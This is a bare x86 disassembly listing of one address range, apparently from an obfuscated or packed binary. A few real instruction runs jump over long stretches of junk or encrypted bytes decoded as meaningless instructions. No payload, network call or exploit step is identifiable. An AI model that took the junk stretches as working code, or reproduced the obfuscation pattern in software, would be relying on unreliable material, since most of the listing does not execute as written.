  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433793,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43370f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43379b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43371b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x4337d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0x4a58f05f
  406b85:	pop    esp
  406b86:	add    bh,BYTE PTR [ebx]
  406b88:	jle    0x406c08
  406b8a:	mov    esp,0xe67e7e7f
  406b8f:	or     ecx,eax
  406b91:	daa    
  406b92:	shl    dh,0x1f
  406b95:	cvtps2pi mm0,QWORD PTR [edx-0x313f2553]
  406b9c:	(bad)  [di]
  406b9f:	pop    es
  406ba0:	les    ecx,FWORD PTR [ecx+0x26]
  406ba3:	sahf   
  406ba4:	rol    BYTE PTR [edx+0x1e332e74],1
  406baa:	push   0xffffff9c
  406bac:	lds    edx,FWORD PTR [ebx]
  406bae:	jl     0x406be1
  406bb0:	(bad)  
  406bb1:	mov    eax,edx
  406bb3:	repz xchg ebx,eax
  406bb5:	lds    eax,FWORD PTR [ebx+0x7a]
  406bb8:	fisubr DWORD PTR [esi+0x1324d7de]
  406bbe:	stos   DWORD PTR es:[edi],eax
  406bbf:	pop    esi
  406bc0:	js     0x406c30
  406bc2:	xchg   dh,dl
  406bc4:	addr16 or esp,ebp
  406bc7:	mov    ds:0x71693d52,al
  406bcc:	loope  0x406b9a
  406bce:	and    BYTE PTR [ebp+0x11dbe895],0xa8
  406bd5:	sub    BYTE PTR [ecx-0x65d0b67f],ah
  406bdb:	mov    bl,0x36
  406bdd:	cmp    DWORD PTR [edx-0x71],esp
  406be0:	lods   eax,DWORD PTR ds:[esi]
  406be1:	mov    fs,ecx
  406be3:	cmp    dh,BYTE PTR [esi+0x45]
  406be6:	and    eax,0x516d961b
  406beb:	pop    ebx
  406bec:	push   esp
  406bed:	pop    ds
  406bee:	bound  ebp,QWORD PTR [ecx+0x52]
  406bf1:	ficomp WORD PTR [ecx+eax*8+0x3]
  406bf5:	jbe    0x406c1f
  406bf7:	jne    0x406c52
  406bf9:	inc    esp
  406bfa:	xchg   BYTE PTR [ebx-0x57],ah
  406bfd:	jg     0x406c3c
  406bff:	mov    ds:0xb50340d4,eax
  406c04:	and    DWORD PTR [esi],edx
  406c06:	inc    ebx
  406c07:	mov    ebp,0x6e0b7f93
  406c0c:	ins    DWORD PTR es:[edi],dx
  406c0d:	cmp    ch,ah
  406c0f:	inc    ebx
  406c10:	xchg   ecx,eax
  406c11:	fwait
  406c12:	jg     0x406c84
  406c14:	inc    eax
  406c15:	or     al,0x4f
  406c17:	push   esp
  406c18:	fisub  DWORD PTR [edx+ecx*1+0x21]
  406c1c:	mov    WORD PTR [edx+0x789cb004],es
  406c22:	or     BYTE PTR [ebx],0xbe
  406c25:	pop    ecx
  406c26:	mov    al,ds:0xf5355f8f
  406c2b:	inc    ebp
  406c2c:	pushf  
  406c2d:	inc    ebp
  406c2e:	test   DWORD PTR [edx],ebx
  406c30:	frstpm(287 only) 
  406c32:	pop    esi
  406c33:	in     eax,0x92
  406c35:	xchg   edi,eax
  406c36:	enter  0x2b0b,0xf0
  406c3a:	sub    eax,0xad40ad49
  406c3f:	xchg   edx,eax
  406c40:	and    BYTE PTR [edi],dh
  406c42:	mov    BYTE PTR [ecx-0x7d],bl
  406c45:	sbb    eax,0x3f20a741
  406c4a:	dec    edi
  406c4b:	mov    edx,0x8b5f9331
  406c50:	mov    al,0x90
  406c52:	ret    0x56c4
  406c55:	pop    es
  406c56:	fsubr  DWORD PTR [ecx-0x80]
  406c59:	push   eax
  406c5a:	ret    0xe411
  406c5d:	sbb    BYTE PTR [eax],bh
  406c5f:	and    cl,BYTE PTR [ecx+0xc6c4107]
  406c65:	loope  0x406c3e
  406c67:	pop    edi
  406c68:	icebp  
  406c69:	call   0x3d2fde10
  406c6e:	aas    
  406c6f:	scas   al,BYTE PTR es:[edi]
  406c70:	mov    al,0xe0
  406c72:	retf   0x47a8
  406c75:	das    
  406c76:	in     eax,0xc3
  406c78:	or     eax,0x7daba6c1
  406c7d:	popa   
  406c7e:	ins    BYTE PTR es:[edi],dx
  406c7f:	push   cs
  406c80:	xchg   esp,eax
  406c81:	sub    ah,ch
  406c83:	mov    dl,0xc3
  406c85:	fcmovu st,st(1)
  406c87:	add    bl,bl
  406c89:	repz pop ebp
  406c8b:	cli    
  406c8c:	jae    0x406cd6
  406c8e:	jbe    0x406cb5
  406c90:	sti    
  406c91:	dec    edx
  406c92:	jnp    0x406ca7
  406c94:	shl    ah,cl
  406c96:	ret    
  406c97:	push   ebp
  406c98:	idiv   BYTE PTR [edi-0x5a]
  406c9b:	dec    ebx
  406c9c:	sar    DWORD PTR [edx],1
  406c9e:	mov    ah,0x9b
  406ca0:	lds    esi,FWORD PTR [esi-0x76]
  406ca3:	add    dh,0x40
  406ca6:	mov    ah,0x71
  406ca8:	jmp    0x71d4f371
  406cad:	fild   WORD PTR [esi+0x5d]
  406cb0:	sti    
  406cb1:	jp     0x406c42
  406cb3:	neg    BYTE PTR [ecx-0x32ab6b15]
  406cb9:	lds    esi,FWORD PTR [edi]
  406cbb:	cdq    
  406cbc:	dec    ecx
  406cbd:	adc    al,0xe4
  406cbf:	(bad)  
  406cc0:	jmp    0xcb3f:0xae9b96a6
  406cc7:	xchg   DWORD PTR [ecx-0x64],ebx
  406cca:	dec    esp
  406ccb:	xchg   ebp,eax
  406ccc:	(bad)  [ebx]
  406cce:	int    0x6c
  406cd0:	loope  0x406d30
  406cd2:	adc    BYTE PTR [ebx+0x5],ch
  406cd5:	xchg   esp,eax
  406cd6:	xor    dl,BYTE PTR [edi]
  406cd8:	jmp    0x10b5772a
  406cdd:	out    dx,eax
  406cde:	out    dx,al
  406cdf:	cmc    
  406ce0:	dec    esp
  406ce1:	cmp    dh,cl
  406ce3:	push   0x61
  406ce5:	jne    0x406c68
  406ce7:	jo     0x406caa
  406ce9:	repz or ch,BYTE PTR [eax-0x3c]
  406ced:	test   eax,0xbc0bb53f
  406cf2:	or     eax,0xd9624aed
  406cf7:	(bad)
  406cfa:	cmp    ch,0xa0
  406cfd:	dec    ebx
  406cfe:	into   
  406cff:	or     eax,0x919a3f9d
  406d04:	or     ch,ch
  406d06:	nop
  406d07:	daa    
  406d08:	shl    BYTE PTR [edi-0x22e7629c],cl
  406d0e:	shr    esp,1
  406d10:	inc    edi
  406d11:	popf   
  406d12:	mov    edi,0x7ecb9cb4
  406d17:	(bad)  
  406d18:	push   0xffffffd1
  406d1a:	je     0x406ccd
  406d1c:	jg     0x406d70
  406d1e:	push   es
  406d1f:	and    eax,0x12d58d87
  406d24:	mov    ds:0x24a88fea,eax
  406d29:	adc    BYTE PTR [ebx],0x6f
  406d2c:	iret   
  406d2d:	inc    ebx
  406d2e:	repnz fs ins DWORD PTR es:[edi],dx
  406d31:	sar    DWORD PTR [eax+0x59],cl
  406d34:	sahf   
  406d35:	hlt    
  406d36:	outs   dx,DWORD PTR ds:[esi]
  406d37:	mov    ds:0xaac263a,al
  406d3c:	cwde   
  406d3d:	into   
  406d3e:	retf   0x46c1
  406d41:	mov    cl,0x85
  406d43:	(bad)  
  406d44:	jns    0x406d3a
  406d46:	mov    edi,0x70b4004c
  406d4b:	jmp    0xfc4814cc
  406d50:	xor    ax,cx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x43382f,0x433713
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x433823,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x433763,0x43370f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0xea
  406d91:	push   edx
  406d92:	lahf   
  406d93:	sbb    al,BYTE PTR [eax+0x38]
  406d96:	jle    0x406e16
  406d98:	mov    esp,0xb47e7e7f
  406d9d:	jnp    0x406dfe
  406d9f:	sar    BYTE PTR [ecx],0xe6
  406da2:	dec    eax
  406da3:	ds push ebx
  406da5:	add    eax,0xa51a31c4
  406daa:	xchg   BYTE PTR [ebx+eax*2],cl
  406dad:	push   ebx
  406dae:	mov    eax,ds:0xc9db177a
  406db3:	sahf   
  406db4:	cmp    esi,DWORD PTR [edi-0x6d]
  406db7:	pop    ebp
  406db8:	pop    esp
  406db9:	loope  0x406d76
  406dbb:	out    0x9e,al
  406dbd:	xor    ecx,DWORD PTR ds:0xc05a246c
  406dc3:	jge    0x406e09
  406dc5:	(bad)  
  406dc6:	jmp    0x406dae
  406dc8:	sbb    esi,DWORD PTR [edi+0x3d54b873]
  406dce:	ins    BYTE PTR es:[edi],dx
  406dcf:	xor    al,BYTE PTR [ecx+0x1942b239]
  406dd5:	mov    esp,DWORD PTR [edi]
  406dd7:	je     0x406d5c
  406dd9:	mov    eax,0x8216807f
  406dde:	xrelease mov BYTE PTR ds:[eax+0x52],dh
  406de3:	(bad)  [esi-0x6fe2d70f]
  406de9:	aaa    
  406dea:	jns    0x406dd0
  406dec:	sub    WORD PTR [ebx+0x380b5d3a],sp
  406df3:	out    dx,al
  406df4:	ret    0xfc20
  406df7:	dec    esp
  406df8:	jle    0x406e15
  406dfa:	pop    ds
  406dfb:	imul   esp,DWORD PTR [eax],0x5e682cef
  406e01:	ja     0x406dba
  406e03:	pop    ds
  406e04:	stos   DWORD PTR es:[edi],eax
  406e05:	jle    0x406df7
  406e07:	mov    al,0x12
  406e09:	call   0x10cd:0x7c969d70
  406e10:	fsub   st(0),st
  406e12:	or     DWORD PTR [esi-0x68d4b0a7],eax
  406e18:	xor    BYTE PTR [edx],bh
  406e1a:	test   eax,edi
  406e1c:	xacquire xchg DWORD PTR [eax+0x75],esp
  406e20:	jb     0x406e92
  406e22:	icebp  
  406e23:	mov    es,ebx
  406e25:	adc    ecx,esi
  406e27:	sbb    ah,BYTE PTR [esi+0x129a83b9]
  406e2d:	in     al,dx
  406e2e:	aaa    
  406e2f:	sahf   
  406e30:	adc    dl,BYTE PTR [esi+eiz*4-0x60]
  406e34:	call   0xafc7:0xb45330a1
  406e3b:	add    BYTE PTR [ebx+0x1a715b9c],0x2c
  406e42:	(bad)  
  406e43:	mov    ebx,0x9c43c0c3
  406e48:	inc    edx
  406e49:	adc    eax,0xf9a8f5d8
  406e4e:	scas   eax,DWORD PTR es:[edi]
  406e4f:	mov    esi,DWORD PTR [edi]
  406e51:	add    edx,DWORD PTR [edx+0x13]
  406e54:	xchg   ebp,eax
  406e55:	xchg   ebx,eax
  406e56:	xchg   BYTE PTR [eax],cl
  406e58:	(bad)  
  406e5a:	push   ds
  406e5b:	aaa    
  406e5c:	mov    bh,BYTE PTR [ebp-0x2f]
  406e5f:	sti    
  406e60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e61:	jo     0x406e34
  406e63:	inc    eax
  406e64:	jecxz  0x406e23
  406e66:	retf   
  406e67:	jmp    0xa1d9302d
  406e6c:	hlt    
  406e6d:	aad    0xe9
  406e6f:	in     eax,dx
  406e70:	xlat   BYTE PTR ds:[ebx]
  406e71:	sub    BYTE PTR [ebx+ecx*8-0x6ea3648b],ah
  406e78:	enter  0x6d62,0xb1
  406e7c:	fld    QWORD PTR [ebx]
  406e7e:	mov    dl,0xea
  406e80:	test   BYTE PTR [edx-0x1d647ca5],0x40
  406e87:	and    al,0x36
  406e89:	popf   
  406e8a:	push   edi
  406e8b:	cmp    ah,BYTE PTR [ebp-0x7e]
  406e8e:	dec    ecx
  406e8f:	sbb    bh,BYTE PTR [ebp-0x46]
  406e92:	in     eax,dx
  406e93:	or     bl,BYTE PTR [edi-0x718b7d6a]
  406e99:	jmp    0x4ce75966
  406e9e:	test   cl,bl
  406ea0:	adc    edx,DWORD PTR [ecx+0x73]
  406ea3:	or     al,0xc0
  406ea5:	mov    dl,0x9e
  406ea7:	pop    ss
  406ea8:	je     0x406ebc
  406eaa:	mov    al,0x6
  406eac:	scas   eax,DWORD PTR es:[edi]
  406ead:	jp     0x406e5c
  406eaf:	xchg   esi,eax
  406eb0:	or     BYTE PTR [ecx+0x47],bh
  406eb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406eb4:	mov    cl,0xc2
  406eb6:	mov    BYTE PTR [edx-0x33af7a95],cl
  406ebc:	sbb    al,0x99
  406ebe:	ds inc edi
  406ec0:	mov    ch,0xb2
  406ec2:	adc    BYTE PTR [ecx+0x6b],ch
  406ec5:	call   0x6d59:0x25727f6a
  406ecc:	(bad)  
  406ecd:	push   ebp
  406ece:	out    dx,al
  406ecf:	sbb    ecx,DWORD PTR ds:0x194918b8
  406ed5:	mov    ds:0xa3aa60b,eax
  406eda:	popf   
  406edb:	adc    bh,ch
  406edd:	ds mov bh,dh
  406ee0:	mov    dh,0x57
  406ee2:	inc    ecx
  406ee3:	lock cmp BYTE PTR [ebx+0x6a4316c4],al
  406eea:	fstp   QWORD PTR [ecx-0x5c4d5470]
  406ef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ef1:	adc    eax,0x996fcc0c
  406ef6:	mov    ch,0xa
  406ef8:	std    
  406ef9:	adc    al,bh
  406efb:	sub    al,bl
  406efd:	mov    bh,0x9f
  406eff:	addr16 push eax
  406f01:	xor    BYTE PTR [ebp+0x1642983d],dh
  406f07:	pop    ebx
  406f08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f09:	adc    eax,0x6fb19a8b
  406f0e:	aam    0x11
  406f10:	cli    
  406f11:	daa    
  406f12:	and    eax,DWORD PTR [esi-0x1c]
  406f15:	clc    
  406f16:	adc    BYTE PTR [edi+0x37],ah
  406f19:	sbb    al,0xc2
  406f1b:	and    DWORD PTR ds:0x5393239f,ebp
  406f21:	outs   dx,DWORD PTR ds:[esi]
  406f22:	shr    DWORD PTR [ecx-0x2b52b1bf],1
  406f28:	push   0x78
  406f2a:	mov    bh,0x4d
  406f2c:	mov    esp,0x1314a638
  406f31:	push   esi
  406f32:	or     DWORD PTR [eax+0x42],eax
  406f35:	pop    es
  406f36:	add    al,0x5e
  406f38:	sub    eax,0x87bb9201
  406f3d:	inc    esp
  406f3e:	add    BYTE PTR [edx-0x11a6bd31],dh
  406f44:	jno    0x406f04
  406f46:	lds    ebp,FWORD PTR [ebp+ebp*2+0x22]
  406f4a:	cs pop esp
  406f4c:	mov    dl,0xa8
  406f4e:	fs test ah,ah
  406f51:	aam    0xc5
  406f53:	xor    BYTE PTR [esi],0x2c
  406f56:	call   0x9c12:0xea399177
  406f5d:	addr16 not eax
  406f60:	and    DWORD PTR ds:0x43370f,0x433753
  406f6a:	and    eax,DWORD PTR [ecx]
  406f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  406f6f:	mov    DWORD PTR [ecx],eax
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0x312e754e
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0x487e7e7f
  406f9f:	imul   edi,DWORD PTR [esi-0x49],0x7c5341fe
  406fa6:	cmp    al,0xf7
  406fa8:	cli    
  406fa9:	inc    esp
  406faa:	lea    ebx,[esi-0x11]
  406fad:	fcom   QWORD PTR [eax-0x7cf47a5e]
  406fb3:	xor    al,BYTE PTR [esi-0x51a50ad]
  406fb9:	je     0x406fa9
  406fbb:	cwde   
  406fbc:	popf   
  406fbd:	les    eax,FWORD PTR [ebx+ebx*8+0x0]
  406fc1:	sub    DWORD PTR [esi+0x620c4eac],ebx
  406fc7:	popf   
  406fc8:	mov    eax,esp
  406fca:	aam    0x76
  406fcc:	test   eax,0x94564a67
  406fd1:	les    edi,FWORD PTR [esi+0x44]
  406fd4:	in     eax,dx
  406fd5:	inc    edi
  406fd6:	out    dx,al
  406fd7:	stos   BYTE PTR es:[edi],al
  406fd8:	push   esi
  406fd9:	out    dx,eax
  406fda:	test   eax,0xa73df907
  406fdf:	push   ss
  406fe0:	mov    ebp,0x16e8737e
  406fe5:	scas   eax,DWORD PTR es:[edi]
  406fe6:	inc    edi
  406fe7:	mov    ah,0x22
  406fe9:	clc    
  406fea:	in     al,0x85
  406fec:	xchg   DWORD PTR [edx-0x31],esi
  406fef:	cmp    esp,DWORD PTR [edi-0x55]
  406ff2:	popa   
  406ff3:	imul   ebx,DWORD PTR [edi-0x50ff3e46],0xfffffffb
  406ffa:	fcmovnb st,st(5)
  406ffc:	sub    eax,ebx
  406ffe:	jp     0x407058
  407000:	scas   al,BYTE PTR es:[edi]
  407001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407002:	and    DWORD PTR [edx+ecx*8],ebp
  407005:	fild   QWORD PTR [ecx+0x253e7dbe]
  40700b:	or     BYTE PTR [ebp-0x26c349c7],cl
  407011:	dec    edi
  407012:	pusha  
  407013:	push   ss
  407014:	push   eax
  407015:	inc    edx
  407016:	stos   DWORD PTR es:[edi],eax
  407017:	fcomp  DWORD PTR ds:0xe00ff3ed
  40701d:	repz xchg ecx,eax
  40701f:	mov    esi,0xa3e048f8
  407024:	inc    ecx
  407025:	test   BYTE PTR [esi-0x6a],0x6d
  407029:	ss int3 
  40702b:	daa    
  40702c:	mov    cl,bl
  40702e:	mov    dl,0x34
  407030:	shr    DWORD PTR [eax],1
  407032:	sub    DWORD PTR [ebp+ebx*2+0x30fd22cd],eax
  407039:	xor    DWORD PTR [edx-0x40],edi
  40703c:	repz not BYTE PTR [eax-0x4b]
  407040:	cmp    BYTE PTR [edx],ah
  407042:	data16 sub bh,ch
  407045:	int3   
  407046:	mul    BYTE PTR [edx+0x40]
  407049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40704a:	inc    edi
  40704b:	pop    ecx
  40704c:	mov    bh,0xa8
  40704e:	jmp    0x73296b8f
  407053:	inc    eax
  407054:	cmp    edx,ecx
  407056:	pushf  
  407057:	jmp    0xd7e70f66
  40705c:	fs jmp 0xfc5cddc5
  407062:	push   eax
  407063:	dec    ecx
  407064:	push   cs
  407065:	lods   eax,DWORD PTR ds:[esi]
  407066:	jbe    0x40704d
  407068:	arpl   WORD PTR [esi-0x664b1816],bx
  40706e:	adc    BYTE PTR [edi],al
  407070:	inc    eax
  407071:	mov    esi,0xa4fc5b67
  407076:	jb     0x406ffe
  407078:	scas   eax,DWORD PTR es:[edi]
  407079:	test   BYTE PTR [edx-0x25],cl
  40707c:	mov    al,ds:0xde759454
  407081:	mov    bl,0x37
  407083:	repz in eax,dx
  407085:	mov    eax,ds:0x2ccb7718
  40708a:	push   eax
  40708b:	call   0x1ce5:0x52a1e643
  407092:	sub    dl,ah
  407094:	push   ds
  407095:	icebp  
  407096:	hlt    
  407097:	gs dec ebx
  407099:	cwde   
  40709a:	xchg   esp,eax
  40709b:	or     DWORD PTR [eax+0x57d6e26],edi
  4070a1:	into   
  4070a2:	cli    
  4070a3:	sub    al,0x90
  4070a5:	aaa    
  4070a6:	leave  
  4070a7:	frstpm(287 only) 
  4070a9:	ss mov ch,0xa5
  4070ac:	aas    
  4070ad:	scas   eax,DWORD PTR es:[edi]
  4070ae:	sbb    eax,0xfcdf501c
  4070b3:	repz xor al,BYTE PTR [edx-0x34]
  4070b7:	cmp    BYTE PTR [edi],0xee
  4070ba:	jg     0x40711e
  4070bc:	daa    
  4070bd:	cmp    DWORD PTR [ebp+0x4490d32d],edx
  4070c3:	loop   0x407091
  4070c5:	adc    BYTE PTR [ecx-0x3438a225],0x67
  4070cc:	hlt    
  4070cd:	rcl    DWORD PTR [esi+0x33],cl
  4070d0:	(bad)  
  4070d1:	int3   
  4070d2:	and    DWORD PTR [eax+0x7b141933],edx
  4070d8:	jb     0x407134
  4070da:	neg    DWORD PTR [esi+edi*2-0x1f77cce4]
  4070e1:	stos   BYTE PTR es:[edi],al
  4070e2:	cli    
  4070e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070e4:	pop    ss
  4070e5:	push   esi
  4070e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070e7:	jge    0x40707f
  4070e9:	cmp    ebx,DWORD PTR [ecx]
  4070eb:	ins    BYTE PTR es:[edi],dx
  4070ec:	adc    al,0x41
  4070ee:	dec    ebx
  4070ef:	inc    eax
  4070f0:	xchg   ecx,eax
  4070f1:	push   cs
  4070f2:	scas   eax,DWORD PTR es:[edi]
  4070f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070f4:	popf   
  4070f5:	and    edx,ebp
  4070f7:	pop    es
  4070f8:	pop    ecx
  4070f9:	sub    DWORD PTR [ebp+0x6f],edi
  4070fc:	dec    eax
  4070fd:	popf   
  4070fe:	hlt    
  4070ff:	add    DWORD PTR [edi-0x69],ebp
  407102:	(bad)  
  407103:	fidivr DWORD PTR [eax]
  407105:	mov    cl,0x9d
  407107:	sub    al,0x4c
  407109:	jnp    0x407107
  40710b:	outs   dx,BYTE PTR ds:[esi]
  40710c:	push   ds
  40710d:	ds repnz aas 
  407110:	or     bl,bh
  407112:	mov    al,ds:0x2744d388
  407117:	sbb    eax,0xc155a920
  40711c:	adc    bh,BYTE PTR [edi-0xe884172]
  407122:	jno    0x40712c
  407124:	jns    0x4070b0
  407126:	adc    edi,DWORD PTR [esi+0x8518e74]
  40712c:	xor    ebp,ebx
  40712e:	sbb    edi,DWORD PTR [ebx-0x32]
  407131:	fstp   DWORD PTR [edi]
  407133:	(bad)  
  407134:	fmul   QWORD PTR [esi-0x16]
  407137:	loope  0x4070dc
  407139:	repnz call 0xf36a:0x9c93b612
  407141:	popa   
  407142:	xor    eax,DWORD PTR [edx]
  407144:	lods   eax,DWORD PTR ds:[esi]
  407145:	jl     0x407183
  407147:	or     al,0xff
  407149:	popf   
  40714a:	push   edx
  40714b:	and    DWORD PTR [ecx],eax
  40714d:	test   cl,ch
  40714f:	(bad)  
  407150:	fistp  DWORD PTR [ecx-0x49]
  407153:	jne    0x40712d
  407155:	sub    DWORD PTR [ebx],edx
  407157:	adc    al,0x13
  407159:	push   0x4c
  40715b:	jmp    0x407105
  40715d:	mov    ?,WORD PTR [edx-0x21]
  407160:	push   DWORD PTR [ebp+0x8]
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	sbb    dl,ah
  40717d:	in     al,0x9f
  40717f:	int3   
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0x957e7e7f
  407188:	sub    eax,0x74aa9c8a
  40718d:	das    
  40718e:	pop    esp
  40718f:	(bad)  
  407190:	cld    
  407191:	mov    cl,BYTE PTR [edi-0x1c]
  407194:	cmp    BYTE PTR [ebx-0x707383af],0x4f
  40719b:	cmp    al,0x70
  40719d:	inc    ebx
  40719e:	(bad)  
  40719f:	mov    edx,0xa0b2a1ac
  4071a4:	ins    DWORD PTR es:[edi],dx
  4071a5:	shl    esi,cl
  4071a7:	push   ebx
  4071a8:	cld    
  4071a9:	(bad)  
  4071aa:	hlt    
  4071ab:	sti    
  4071ac:	(bad)  
  4071ad:	jo     0x40719b
  4071af:	mov    ah,0x44
  4071b1:	pop    es
  4071b2:	dec    ecx
  4071b3:	mov    BYTE PTR [edx],0xb6
  4071b6:	and    BYTE PTR [eax+0x26b63924],al
  4071bc:	xchg   BYTE PTR [edx+0x54],al
  4071bf:	mov    ds:0xf430ffc9,al
  4071c4:	in     eax,0x9
  4071c6:	aam    0xaa
  4071c8:	mov    bh,0xc8
  4071ca:	sti    
  4071cb:	adc    eax,0x263c98f1
  4071d0:	adc    ecx,edi
  4071d2:	inc    esi
  4071d3:	adc    al,0xd3
  4071d5:	xchg   edx,eax
  4071d6:	icebp  
  4071d7:	dec    ebx
  4071d8:	push   ebp
  4071d9:	xor    DWORD PTR [ebp-0x1d4b97b0],ebp
  4071df:	dec    ebp
  4071e0:	ret    0xa751
  4071e3:	test   DWORD PTR [esi+0x2],ecx
  4071e6:	mov    dh,ch
  4071e8:	retf   
  4071e9:	adc    BYTE PTR [esi+0x3a],ah
  4071ec:	call   0xe4f:0x310e33f5
  4071f3:	out    0x2f,al
  4071f5:	lods   eax,DWORD PTR ds:[esi]
  4071f6:	vminps xmm5,xmm7,XMMWORD PTR [edi+0x77]
  4071fb:	or     BYTE PTR [ebp*8-0x55626237],dh
  407202:	and    ebx,DWORD PTR [edx+0x11c4330]
  407208:	retf   0x36fa
  40720b:	adc    eax,0x1ed0540d
  407210:	xor    DWORD PTR [edx+0x57],ebp
  407213:	out    0x6c,al
  407215:	cmp    DWORD PTR [eax],ebp
  407217:	repz jmp 0xacff7b41
  40721d:	addr16 loopne 0x4071ed
  407220:	into   
  407221:	fidivr WORD PTR [ebx-0x1ade2a39]
  407227:	retf   0xcc08
  40722a:	pop    eax
  40722b:	xor    BYTE PTR [ebp-0x149bbc68],ah
  407231:	frstor [eax]
  407233:	add    BYTE PTR [eax-0x49],dh
  407236:	call   0xd597:0x68fd84da
  40723d:	scas   al,BYTE PTR es:[edi]
  40723e:	in     eax,0x46
  407240:	arpl   di,sp
  407242:	mov    edi,0xd0e44068
  407247:	loop   0x40728a
  407249:	loop   0x407289
  40724b:	jne    0x4072b1
  40724d:	cwde   
  40724e:	inc    esp
  40724f:	cmp    eax,ebp
  407251:	pusha  
  407252:	out    0x36,eax
  407254:	xchg   ebp,eax
  407255:	(bad)  
  407257:	je     0x4071e0
  407259:	mov    WORD PTR [esi],ds
  40725b:	xor    eax,0x826a9997
  407260:	outs   dx,DWORD PTR ds:[esi]
  407261:	outs   dx,BYTE PTR ds:[esi]
  407262:	mov    BYTE PTR [esp+ebx*1],dl
  407265:	jle    0x40728d
  407267:	outs   dx,BYTE PTR ds:[esi]
  407268:	mov    ds:0x9f0e9fd8,al
  40726d:	ret    0x6052
  407270:	hlt    
  407271:	xchg   DWORD PTR [ebp+0x7e22f289],ebx
  407277:	sbb    BYTE PTR [esi-0x6e],ah
  40727a:	scas   eax,DWORD PTR es:[edi]
  40727b:	dec    ecx
  40727c:	enter  0x805c,0xa2
  407280:	fwait
  407281:	push   edx
  407282:	cmp    al,0x8e
  407284:	daa    
  407285:	neg    DWORD PTR [esi]
  407287:	mov    dl,BYTE PTR [edi-0xedbd45e]
  40728d:	js     0x4072bd
  40728f:	jbe    0x4072b1
  407291:	and    BYTE PTR [eax+0x2ee6e7c6],0x85
  407298:	retf   0x2902
  40729b:	jns    0x407305
  40729d:	push   eax
  40729e:	jo     0x40722f
  4072a0:	mov    bl,0xb
  4072a2:	mov    ds:0x50094e3a,al
  4072a7:	mul    BYTE PTR [edx+0x59117fb4]
  4072ad:	stc    
  4072ae:	adc    BYTE PTR [ebp-0x513e395],dh
  4072b4:	retf   
  4072b5:	fnstcw WORD PTR [ebp-0x29a2e7fa]
  4072bb:	ret    0x3679
  4072be:	(bad)  
  4072bf:	stos   BYTE PTR es:[edi],al
  4072c0:	call   0x1319:0x2a693d62
  4072c7:	inc    esi
  4072c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072c9:	sbb    ebx,DWORD PTR [edi+0x120119e8]
  4072cf:	out    0x2e,al
  4072d1:	outs   dx,DWORD PTR ds:[esi]
  4072d2:	cmp    DWORD PTR [ebx+edi*8+0xa0d029c],esi
  4072d9:	fcomp  QWORD PTR [ebp+0x5539a31f]
  4072df:	xor    di,WORD PTR [edx+0x2d]
  4072e3:	dec    esp
  4072e4:	test   al,0x72
  4072e6:	or     al,0xb3
  4072e8:	mov    esi,0xd8a8988
  4072ed:	inc    ebx
  4072ee:	cmp    eax,eax
  4072f0:	fistp  QWORD PTR [edi]
  4072f2:	fcmovbe st,st(1)
  4072f4:	fldenv [edi-0x3e]
  4072f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072f8:	mov    edx,0x658c8322
  4072fd:	add    DWORD PTR [ebx+0x21101d6],0xd88e1d9b
  407307:	loopne 0x40736e
  407309:	pop    ds
  40730a:	mov    al,0x74
  40730c:	cmp    DWORD PTR [ebp*2-0x3a4c72cf],ebx
  407313:	xchg   esi,eax
  407314:	sub    al,0x28
  407316:	stos   DWORD PTR es:[edi],eax
  407317:	out    dx,eax
  407318:	or     bl,ah
  40731a:	and    DWORD PTR [ebx-0xf2633a8],ecx
  407320:	dec    ebp
  407321:	out    dx,al
  407322:	or     al,0xf5
  407324:	mov    cs,eax
  407326:	xchg   edx,eax
  407327:	aam    0x9e
  407329:	stos   BYTE PTR es:[edi],al
  40732a:	adc    esp,DWORD PTR [edi]
